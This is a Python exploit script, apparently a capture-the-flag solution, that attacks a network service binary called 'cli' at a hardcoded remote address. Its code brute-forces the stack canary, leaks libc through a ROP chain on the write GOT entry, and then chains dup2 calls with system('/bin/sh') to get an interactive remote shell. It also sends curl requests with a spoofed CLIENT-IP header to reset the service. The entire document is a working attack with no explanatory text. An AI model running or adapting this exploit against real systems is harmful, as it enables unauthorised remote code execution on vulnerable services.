#!/usr/bin/env python
from sc_expwn import *
import os

bin_file = './cli'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':2323}, \
                        remote  = {'host':'94.130.149.88', 'port':2323})
env.set_item('libc',    local   = None, \
                        remote  = './libc-2.24.so')
env.set_item('canary',  local = 0xa2a9875649c11200, remote = '\x00\x9d\x04R\xb4\x63\x3f\xed')
env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_got_write      = binf.got['write']

addr_plt_exit       = binf.plt['exit']
addr_mainroutine    = 0x400f67

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_main    = libc.sep_function['__libc_start_main']

fd = 5

#==========

def connect(environ, curl = False):
    if environ.check('remote') and curl:
        os.system('curl -H "CLIENT-IP: 127.0.0.1" -XPUT -H "Content-Type: application/json" -d \'{"Reset":"256"}\' "http://94.130.149.88/rest/?msubmenu=control"')
        sleep(0.8)
        os.system('curl -H "CLIENT-IP: 127.0.0.1" -XPUT -H "Content-Type: application/json" -d \'{"Set":"256"}\' "http://94.130.149.88/rest/?msubmenu=control"')

    conn = communicate(environ.mode, **environ.target)
    conn.sendafter('Password: ', '\x00'*0x20)
    if conn.recv(1) != '\n':
        conn.close()
        conn = connect(environ)

    return conn

def leak_canary(canary):
    lv = context.log_level
    #context.log_level = 100

    if not canary:
        canary = '\x00'
    elif isinstance(canary, int) or isinstance(canary, long):
        canary = p(canary).rstrip('\x00')

    while len(canary)<8:
        for c in range(0x80, 0x100):
        #for c in range(0x7f, 0, -1):
            conn = connect(env)
            conn.sendafter('[default 1]:', '2')
            conn.sendafter('value: ', '1')

            exploit  = 'n '
            exploit += p64(0)
            exploit += '\x00'*(0x7a - len(exploit))
            exploit += canary+chr(c)
            conn.sendlineafter('(Y/n):', exploit)
            
            try:
                conn.read()
            except:
                conn.close()
                continue

        
            canary += chr(c)
            conn.close()
            context.log_level = lv
            info('Detected canary : 0x%x' % u(canary))
            #context.log_level = 100
            break

    canary = u64(canary)

    context.log_level = lv
    success('CANARY FOUND : 0x%016x' % canary)

    return canary

def attack(conn, canary):
    rop = ROP(binf)

    payload  = p64(0x4016da)
    payload += p64(0)
    payload += p64(1)
    payload += p64(addr_got_write)
    payload += p64(8)               # count
    payload += p64(addr_got_main)   # buf
    payload += p64(fd)              # fd
    payload += p64(0x4016c0)
    payload += p64(0xdeadbeef)*7

    payload += p64(rop.rdi.address)
    payload += p64(fd)
    payload += p64(addr_mainroutine)

    attack_bof(conn, payload)

    addr_libc_main  = u64(conn.recv(8))
    
    info('addr_libc = 0x%08x' % addr_libc_main)
    libc.address = addr_libc_main - offset_libc_main
    info('addr_libc_base = 0x%08x' % libc.address)
    addr_libc_system    = libc.sep_function['system']
    addr_libc_dup2      = libc.sep_function['dup2']
    addr_libc_strsh     = next(libc.search('/bin/sh'))


    payload  = p64(rop.rdi.address)
    payload += p64(fd)
    payload += p64(rop.rsi_r15.address)
    payload += p64(constants.STDIN_FILENO)
    payload += p64(0xcafebabe)
    payload += p64(addr_libc_dup2)

    payload += p64(rop.rsi_r15.address)
    payload += p64(constants.STDOUT_FILENO)
    payload += p64(0xcafebabe)
    payload += p64(addr_libc_dup2)

    payload += p64(rop.rsi_r15.address)
    payload += p64(constants.STDERR_FILENO)
    payload += p64(0xcafebabe)
    payload += p64(addr_libc_dup2)

    payload += p64(rop.rdi.address)
    payload += p64(addr_libc_strsh)
    payload += p64(addr_libc_system)

    payload += p64(addr_plt_exit)

    attack_bof(conn, payload)


def attack_bof(conn, payload):
    conn.sendafter('[default 1]:', '2')
    conn.sendafter('value: ', '1')

    exploit  = 'n '
    exploit += p64(0)
    exploit += '\x00'*(0x7a - len(exploit))
    exploit += p64(canary)
    exploit += p64(0xdeadbeef)
    exploit += payload

    conn.sendlineafter('(Y/n):', exploit)
 
#==========

if __name__=='__main__':
    canary = leak_canary(env.canary)

    conn = connect(env)
    attack(conn, canary)
    conn.interactive()
    
#==========
